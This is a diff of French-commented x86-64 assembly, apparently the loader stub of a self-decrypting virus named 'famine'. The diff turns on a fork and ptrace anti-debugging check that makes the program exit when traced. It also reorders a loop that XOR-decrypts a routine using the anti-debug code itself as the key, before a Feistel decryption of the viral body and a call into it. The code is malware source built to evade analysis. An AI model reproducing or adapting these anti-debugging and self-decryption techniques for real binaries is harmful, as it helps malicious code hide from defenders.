@@ -23,67 +23,75 @@ _start:
 
 	jmp NEAR decrypt_done
 
-; _fork:
-;     mov rax, 57          ; syscall fork()
-;     syscall
-;     test rax, rax        ; Vérifier si on est dans le parent ou l'enfant
-;     jz _ptrace           ; Si rax == 0, c'est l'enfant
-;     jmp parent_process 
+_fork:
+    mov rax, 57             ; syscall fork()
+    syscall
+    cmp rax, 0              ; Vérifier si on est dans le parent ou l'enfant
+    je _ptrace              ; Si rax == 0, c'est l'enfant
+    jl _end                 ; Si rax < 0, fork a échoué
 
-; debugger_detected:
-;     ; Tuer le processus si un débogueur est détecté
-;     ; mov rax, 39           ; getpid syscall
-;     ; syscall
-;     ; mov rdi, rax
-;     ; mov rax, 62           ; kill syscall (SIGKILL)
-;     ; syscall
-;     mov	rax, 60
-; 	mov	rdi, 12
-; 	syscall
+parent_process:
+    push    0x0a2e746E    ;    nt.\n
+    push    0x65726170    ;    pare
 
-; parent_process:
-;     mov rdi, -1           ; pid = -1 (attendre n'importe quel enfant)
-;     xor rsi, rsi          ; status = NULL
-;     xor rdx, rdx          ; options = 0
-;     mov rax, 61           ; waitpid syscall
-;     syscall
-;     ; Vérifier le code de retour de l'enfant
-;     shr rsi, 8            ; Extraire le code de retour (exit status >> 8)
-;     cmp rsi, -1           ; Si le code est -1, un débogueur a été détecté
-;     je debugger_detected
-;     jmp _manual_modif
+    ;    write(stderr, "...WOODY...\n", 20)
+    mov        rax, 1        ;    syscall number
+    mov        rdi, 2        ;    stderr
+    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
+    mov        rdx, 16        ;    20
+    syscall
 
-_manual_modif:
-    lea r15, [rel _ptrace]       ; Début de _ptrace
-    lea r14, [rel _ptrace_end]    ; Fin de _ptrace
-    lea r13, [rel decrypt]       ; Début de decrypt
+    ;    Clear la stack pour pas avoir de problemes
+    pop    rax
+    pop    rax
+    
+    mov rdi, -1             ; pid = -1 (attendre n'importe quel enfant)
+    xor rsi, rsi            ; status = NULL
+    xor rdx, rdx            ; options = 0
+    mov rax, 61             ; waitpid syscall
+    syscall
 
-.loop:
-    cmp r15, r14                 ; while (current_ptrace < end_ptrace)
-    jae _ptrace                  ; Si on dépasse la fin, sortir
+    ; Vérifier le code de retour de l'enfant
+    shr rsi, 8              ; Extraire le code de retour (exit status >> 8)
+    cmp rsi, 1             ; Si le code est 1, un débogueur a été détecté
+    je _end                 ; Sortir si un débogueur est détecté
 
-    mov edx, [r15]               ; Charger 4 octets de _ptrace (clé)
-    mov ecx, [r13]               ; Charger 4 octets de decrypt (données chiffrées)
-    xor ecx, edx ; Déchiffrer avec XOR
-    mov [r13], ecx               ; Sauvegarder les données déchiffrées dans decrypt
-
-    add r15, 4                   ; Avancer de 4 octets dans _ptrace
-    add r13, 4                   ; Avancer de 4 octets dans decrypt
-    jmp .loop                    ; Répéter la boucle
-
+    jmp _manual_modif
 
 _ptrace:
+    push    0x0a2e746E     ;    nt.\n
+    push    0x61666E65    ;    enfa
+
+    ;    write(stderr, "...WOODY...\n", 20)
+    mov        rax, 1        ;    syscall number
+    mov        rdi, 2        ;    stderr
+    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
+    mov        rdx, 16        ;    20
+    syscall
+
+    ;    Clear la stack pour pas avoir de problemes
+    pop    rax
+    pop    rax
+
+
     xor rdi, rdi
     xor rsi, rsi
     xor rdx, rdx
     xor r10, r10
     mov rax, 101
     syscall
-    ; Vérifier si ptrace a échoué
-    test rax, rax
-    jge decrypt
 
-    jmp _end
+    cmp rax, 0
+    jne exit1
+    
+	mov	rdi, rax
+    mov	rax, 60
+	syscall
+
+exit1:
+    mov rdi, 1
+    mov rax, 60
+    syscall
 
 _ptrace_end:
     nop
@@ -94,10 +102,28 @@ _ptrace_end:
     nop
     nop
 
+_manual_modif:
+    lea r15, [rel _ptrace]          ; Début de _ptrace
+    lea r14, [rel _ptrace_end]      ; Fin de _ptrace
+    lea r13, [rel decrypt]          ; Début de decrypt
+
+.loop:
+    cmp r15, r14                ; while (current_ptrace < end_ptrace)
+    jae decrypt                 ; Si on dépasse la fin, sortir
+
+    mov edx, [r15]              ; Charger 4 octets de _ptrace (clé)
+    mov ecx, [r13]              ; Charger 4 octets de decrypt (données chiffrées)
+    xor ecx, edx                ; Déchiffrer avec XOR
+    mov [r13], ecx              ; Sauvegarder les données déchiffrées dans decrypt
+
+    add r15, 4                  ; Avancer de 4 octets dans _ptrace
+    add r13, 4                  ; Avancer de 4 octets dans decrypt
+    jmp .loop                   ; Répéter la boucle
+
 decrypt:
-    lea r8, [rel famine]             ; Adresse de début (famine)
-    lea r9, [rel _start]       ; Adresse de fin (_start)
-    mov r10, 0x00000000      ; Exemple de clé 64 bits
+    lea r8, [rel famine]            ; Adresse de début (famine)
+    lea r9, [rel _start]            ; Adresse de fin (_start)
+    mov r10, 0x00000000             ; Exemple de clé 64 bits
 
 
 decrypt_loop:
@@ -106,21 +132,21 @@ decrypt_loop:
     cmp rax, 8
     jl decrypt_done                 ; Si r9 - r8 < 8, fin du décryptage
 
-    mov	r12, [r8]                    ; Charger le bloc chiffré dans r12
+    mov	r12, [r8]                   ; Charger le bloc chiffré dans r12
 
-    mov r14d, r12d                   ; right = partie basse du bloc
-    shr r12, 32                      ; Décaler pour obtenir la partie haute
-    mov r13d, r12d                   ; left = partie haute du bloc
+    mov r14d, r12d                  ; right = partie basse du bloc
+    shr r12, 32                     ; Décaler pour obtenir la partie haute
+    mov r13d, r12d                  ; left = partie haute du bloc
 
-    mov ecx, 0x7                     ; 8 rounds inverses
+    mov ecx, 0x7                    ; 8 rounds inverses
     
 reverse_rounds:
-    mov eax, ecx                     ; Calcul de la sous-clé
-    imul eax, eax, 0x1234ABCD        ; subkey = round * 0x1234ABCD
-    xor eax, r10d                    ; subkey ^= clé
+    mov eax, ecx                    ; Calcul de la sous-clé
+    imul eax, eax, 0x1234ABCD       ; subkey = round * 0x1234ABCD
+    xor eax, r10d                   ; subkey ^= clé
 
     ; Feistel déchiffrement
-    mov r11d, r14d                   ; temp = right
+    mov r11d, r14d                  ; temp = right
     mov esi, r14d
     shl esi, 3
     mov edi, r14d
@@ -128,15 +154,15 @@ reverse_rounds:
     or  esi, edi
     xor r14d, eax
     add r14d, esi
-    xor r14d, r13d                   ; left = right ^ feistel_function(left, subkey)
-    mov r13d, r11d                   ; right = temp
+    xor r14d, r13d                  ; left = right ^ feistel_function(left, subkey)
+    mov r13d, r11d                  ; right = temp
     dec ecx
-    jns reverse_rounds               ; Répéter pour tous les rounds
+    jns reverse_rounds              ; Répéter pour tous les rounds
 
     ; Recomposer le bloc déchiffré
     shl r13, 32
-    or r14, r13                      ; Fusionner left et right
-    mov [r8], r14                    ; Stocker le bloc déchiffré dans la mémoire
+    or r14, r13                     ; Fusionner left et right
+    mov [r8], r14                   ; Stocker le bloc déchiffré dans la mémoire
 
 
     ; Passer au bloc suivant (8 octets)
@@ -144,6 +170,23 @@ reverse_rounds:
     jmp decrypt_loop
 
 decrypt_done:
+
+    push    0x0a2e2e2e    ;    ...\n
+    push    0x59444f4f    ;    OODY
+    push    0x572e2e2e    ;    ...W
+
+    ;    write(stderr, "...WOODY...\n", 20)
+    mov        rax, 1        ;    syscall number
+    mov        rdi, 2        ;    stderr
+    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
+    mov        rdx, 20        ;    20
+    syscall
+
+    ;    Clear la stack pour pas avoir de problemes
+    pop    rax
+    pop    rax
+    pop    rax
+
 	call	famine	
 
 _end:
